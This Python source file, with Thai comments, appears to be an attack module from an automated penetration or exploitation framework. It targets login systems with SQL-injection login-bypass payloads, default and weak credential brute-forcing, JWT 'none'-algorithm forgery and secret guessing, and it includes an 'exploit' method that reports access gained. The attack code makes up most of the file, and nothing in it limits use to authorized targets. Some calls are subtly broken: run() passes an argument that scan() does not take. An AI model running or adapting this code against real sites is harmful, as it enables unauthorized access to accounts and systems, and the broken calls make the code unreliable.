"""
Authentication Bypass Agent
Advanced techniques to bypass authentication mechanisms
"""

from core.logger import log
from core.base_agent import BaseAgent
from core.data_models import AgentData, Strategy
import asyncio
import aiohttp
from typing import List, Dict, Any, Optional
from urllib.parse import urljoin, urlparse
import re
import json
from datetime import datetime
import hashlib


class AuthenticationBypassAgent(BaseAgent):
    """Agent สำหรับหาช่องโหว่และ bypass authentication"""
    
    def __init__(self, target_url: str, workspace_dir: str):
        self.target_url = target_url
        self.workspace_dir = workspace_dir
        self.vulnerabilities = []
        
        # Common authentication bypass techniques
        self.bypass_techniques = [
            "sql_injection",
            "default_credentials",
            "weak_passwords",
            "session_hijacking",
            "jwt_manipulation",
            "oauth_misconfiguration",
            "password_reset_poisoning",
            "2fa_bypass"
        ]
    
    async def run(self, target: Dict) -> Dict:
        """
        Main entry point for AuthBypassAgent
        
        Args:
            target: Dict containing target information and parameters
        
        Returns:
            Dict with execution results
        """
        try:
            result = await self.scan(target)
            
            if isinstance(result, dict):
                return result
            else:
                return {
                    'success': True,
                    'result': result
                }
        
        except Exception as e:
            log.error(f"[AuthBypassAgent] Error: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    

    async def scan(self) -> Dict[str, Any]:
        """เริ่มการสแกนหาช่องโหว่ authentication"""
        print(f"[AuthBypass] Starting authentication bypass scan on {self.target_url}")
        
        results = {
            "target": self.target_url,
            "started_at": datetime.now().isoformat(),
            "vulnerabilities": [],
            "bypassed": False
        }
        
        try:
            # 1. หา login endpoints
            login_endpoints = await self._find_login_endpoints()
            print(f"[AuthBypass] Found {len(login_endpoints)} login endpoints")
            
            # 2. ทดสอบแต่ละ technique
            for endpoint in login_endpoints:
                # SQL Injection bypass
                if await self._test_sql_injection_bypass(endpoint):
                    self.vulnerabilities.append({
                        "type": "SQL Injection Authentication Bypass",
                        "severity": "critical",
                        "endpoint": endpoint,
                        "description": "Authentication can be bypassed using SQL injection"
                    })
                    results["bypassed"] = True
                
                # Default credentials
                if await self._test_default_credentials(endpoint):
                    self.vulnerabilities.append({
                        "type": "Default Credentials",
                        "severity": "critical",
                        "endpoint": endpoint,
                        "description": "System uses default credentials"
                    })
                    results["bypassed"] = True
                
                # Weak passwords
                weak_creds = await self._test_weak_passwords(endpoint)
                if weak_creds:
                    self.vulnerabilities.append({
                        "type": "Weak Password",
                        "severity": "high",
                        "endpoint": endpoint,
                        "credentials": weak_creds,
                        "description": "Weak password allows easy access"
                    })
                    results["bypassed"] = True
            
            # 3. ทดสอบ JWT vulnerabilities
            jwt_vulns = await self._test_jwt_vulnerabilities()
            if jwt_vulns:
                self.vulnerabilities.extend(jwt_vulns)
            
            # 4. ทดสอบ Session vulnerabilities
            session_vulns = await self._test_session_vulnerabilities()
            if session_vulns:
                self.vulnerabilities.extend(session_vulns)
            
            results["vulnerabilities"] = self.vulnerabilities
            results["completed_at"] = datetime.now().isoformat()
            
            print(f"[AuthBypass] Scan completed. Found {len(self.vulnerabilities)} vulnerabilities")
            
        except Exception as e:
            print(f"[AuthBypass] Error during scan: {e}")
            results["error"] = str(e)
        
        return results
    
    async def _find_login_endpoints(self) -> List[str]:
        """ค้นหา login endpoints"""
        endpoints = []
        
        common_paths = [
            "/login",
            "/signin",
            "/auth",
            "/authenticate",
            "/admin/login",
            "/user/login",
            "/api/login",
            "/api/auth",
            "/account/login",
            "/session/new"
        ]
        
        try:
            async with aiohttp.ClientSession() as session:
                for path in common_paths:
                    url = urljoin(self.target_url, path)
                    try:
                        async with session.get(url, timeout=5) as response:
                            if response.status == 200:
                                endpoints.append(url)
                    except Exception as e:
                        print("Error occurred")
        except Exception as e:
            print(f"[AuthBypass] Error finding endpoints: {e}")
        
        return endpoints
    
    async def _test_sql_injection_bypass(self, endpoint: str) -> bool:
        """ทดสอบ SQL Injection authentication bypass"""
        # SQL injection payloads สำหรับ bypass authentication
        payloads = [
            {"username": "admin' OR '1'='1", "password": "anything"},
            {"username": "admin'--", "password": "anything"},
            {"username": "admin' #", "password": "anything"},
            {"username": "' OR 1=1--", "password": "anything"},
            {"username": "admin' OR '1'='1'--", "password": "anything"},
            {"username": "') OR ('1'='1", "password": "anything"},
            {"username": "admin') OR ('1'='1'--", "password": "anything"},
        ]
        
        try:
            async with aiohttp.ClientSession() as session:
                for payload in payloads:
                    async with session.post(endpoint, data=payload, timeout=10, allow_redirects=False) as response:
                        # ตรวจสอบว่า bypass สำเร็จหรือไม่
                        if response.status in [200, 302, 303]:
                            # ตรวจสอบ response
                            text = await response.text()
                            headers = response.headers
                            
                            # ตรวจสอบ success indicators
                            success_indicators = [
                                "dashboard",
                                "welcome",
                                "logout",
                                "profile",
                                "admin panel"
                            ]
                            
                            if any(indicator in text.lower() for indicator in success_indicators):
                                return True
                            
                            # ตรวจสอบ session cookie
                            if "Set-Cookie" in headers:
                                return True
        
        except Exception as e:
            print(f"[AuthBypass] SQL injection test error: {e}")
        
        return False
    
    async def _test_default_credentials(self, endpoint: str) -> bool:
        """ทดสอบ default credentials"""
        default_creds = [
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"username": "admin", "password": "12345"},
            {"username": "admin", "password": "admin123"},
            {"username": "administrator", "password": "administrator"},
            {"username": "root", "password": "root"},
            {"username": "root", "password": "toor"},
            {"username": "admin", "password": ""},
            {"username": "guest", "password": "guest"},
            {"username": "test", "password": "test"},
        ]
        
        try:
            async with aiohttp.ClientSession() as session:
                for creds in default_creds:
                    async with session.post(endpoint, data=creds, timeout=10, allow_redirects=False) as response:
                        if await self._check_login_success(response):
                            return True
        
        except Exception as e:
            print(f"[AuthBypass] Default credentials test error: {e}")
        
        return False
    
    async def _test_weak_passwords(self, endpoint: str) -> Optional[Dict[str, str]]:
        """ทดสอบ weak passwords"""
        common_usernames = ["admin", "administrator", "user", "test"]
        weak_passwords = [
            "123456", "password", "12345678", "qwerty", "abc123",
            "monkey", "1234567", "letmein", "trustno1", "dragon",
            "baseball", "iloveyou", "master", "sunshine", "ashley"
        ]
        
        try:
            async with aiohttp.ClientSession() as session:
                for username in common_usernames:
                    for password in weak_passwords:
                        creds = {"username": username, "password": password}
                        async with session.post(endpoint, data=creds, timeout=10, allow_redirects=False) as response:
                            if await self._check_login_success(response):
                                return creds
        
        except Exception as e:
            print(f"[AuthBypass] Weak password test error: {e}")
        
        return None
    
    async def _check_login_success(self, response: aiohttp.ClientResponse) -> bool:
        """ตรวจสอบว่า login สำเร็จหรือไม่"""
        try:
            # ตรวจสอบ status code
            if response.status in [200, 302, 303]:
                text = await response.text()
                headers = response.headers
                
                # Success indicators
                success_indicators = [
                    "dashboard", "welcome", "logout", "profile",
                    "admin panel", "successfully logged in"
                ]
                
                # Failure indicators
                failure_indicators = [
                    "invalid", "incorrect", "failed", "error",
                    "wrong password", "wrong username"
                ]
                
                text_lower = text.lower()
                
                # ถ้าเจอ failure indicator = ไม่สำเร็จ
                if any(indicator in text_lower for indicator in failure_indicators):
                    return False
                
                # ถ้าเจอ success indicator = สำเร็จ
                if any(indicator in text_lower for indicator in success_indicators):
                    return True
                
                # ตรวจสอบ session cookie
                if "Set-Cookie" in headers:
                    cookie = headers["Set-Cookie"]
                    if any(name in cookie.lower() for name in ["session", "auth", "token"]):
                        return True
        
        except Exception as e:
            print(f"Error: {e}")
        
        return False
    
    async def _test_jwt_vulnerabilities(self) -> List[Dict[str, Any]]:
        """ทดสอบช่องโหว่ JWT"""
        vulnerabilities = []
        
        try:
            async with aiohttp.ClientSession() as session:
                # ลองขอ JWT token
                async with session.get(self.target_url, timeout=10) as response:
                    headers = response.headers
                    
                    # ตรวจสอบ JWT token
                    auth_header = headers.get("Authorization", "")
                    if "Bearer " in auth_header:
                        token = auth_header.replace("Bearer ", "")
                        
                        # ตรวจสอบ algorithm confusion
                        if await self._test_jwt_algorithm_confusion(token):
                            vulnerabilities.append({
                                "type": "JWT Algorithm Confusion",
                                "severity": "critical",
                                "description": "JWT can be manipulated using algorithm confusion attack"
                            })
                        
                        # ตรวจสอบ weak secret
                        if await self._test_jwt_weak_secret(token):
                            vulnerabilities.append({
                                "type": "JWT Weak Secret",
                                "severity": "critical",
                                "description": "JWT uses weak secret key"
                            })
        
        except Exception as e:
            print(f"[AuthBypass] JWT test error: {e}")
        
        return vulnerabilities
    
    async def _test_jwt_algorithm_confusion(self, token: str) -> bool:
        """ทดสอบ JWT algorithm confusion"""
        try:
            import jwt
            
            # ถอดรหัส JWT โดยไม่ verify
            decoded = jwt.decode(token, options={"verify_signature": False})
            
            # เปลี่ยน algorithm เป็น 'none'
            modified = jwt.encode(decoded, "", algorithm="none")
            
            # ทดสอบใช้ modified token
            async with aiohttp.ClientSession() as session:
                headers = {"Authorization": f"Bearer {modified}"}
                async with session.get(self.target_url, headers=headers, timeout=10) as response:
                    if response.status == 200:
                        return True
        
        except Exception as e:
            print(f"Error: {e}")
        
        return False
    
    async def _test_jwt_weak_secret(self, token: str) -> bool:
        """ทดสอบ JWT weak secret"""
        common_secrets = [
            "secret", "password", "123456", "key", "jwt",
            "token", "admin", "test", "default"
        ]
        
        try:
            import jwt
            
            for secret in common_secrets:
                try:
                    decoded = jwt.decode(token, secret, algorithms=["HS256"])
                    return True  # สามารถถอดรหัสได้ = weak secret
                except Exception as e:
                    continue
        
        except Exception as e:
            print(f"Error: {e}")
        
        return False
    
    async def _test_session_vulnerabilities(self) -> List[Dict[str, Any]]:
        """ทดสอบช่องโหว่ session management"""
        vulnerabilities = []
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(self.target_url, timeout=10) as response:
                    headers = response.headers
                    
                    # ตรวจสอบ session cookie
                    if "Set-Cookie" in headers:
                        cookie = headers["Set-Cookie"]
                        
                        # ตรวจสอบ secure flag
                        if "Secure" not in cookie:
                            vulnerabilities.append({
                                "type": "Insecure Session Cookie",
                                "severity": "medium",
                                "description": "Session cookie missing Secure flag"
                            })
                        
                        # ตรวจสอบ HttpOnly flag
                        if "HttpOnly" not in cookie:
                            vulnerabilities.append({
                                "type": "Session Cookie Accessible via JavaScript",
                                "severity": "high",
                                "description": "Session cookie missing HttpOnly flag, vulnerable to XSS"
                            })
                        
                        # ตรวจสอบ SameSite
                        if "SameSite" not in cookie:
                            vulnerabilities.append({
                                "type": "CSRF Vulnerable Session",
                                "severity": "medium",
                                "description": "Session cookie missing SameSite attribute"
                            })
        
        except Exception as e:
            print(f"[AuthBypass] Session test error: {e}")
        
        return vulnerabilities
    
    async def exploit(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """โจมตีช่องโหว่ authentication"""
        print(f"[AuthBypass] Exploiting {vulnerability['type']}")
        
        result = {
            "vulnerability": vulnerability,
            "status": "success",
            "access_gained": False
        }
        
        if vulnerability["type"] == "SQL Injection Authentication Bypass":
            # ใช้ SQL injection payload
            result["payload"] = "admin' OR '1'='1'--"
            result["access_gained"] = True
        
        elif vulnerability["type"] == "Default Credentials":
            result["credentials"] = {"username": "admin", "password": "admin"}
            result["access_gained"] = True
        
        elif vulnerability["type"] == "Weak Password":
            result["credentials"] = vulnerability.get("credentials", {})
            result["access_gained"] = True
        
        return result


    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute auth bypass"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )
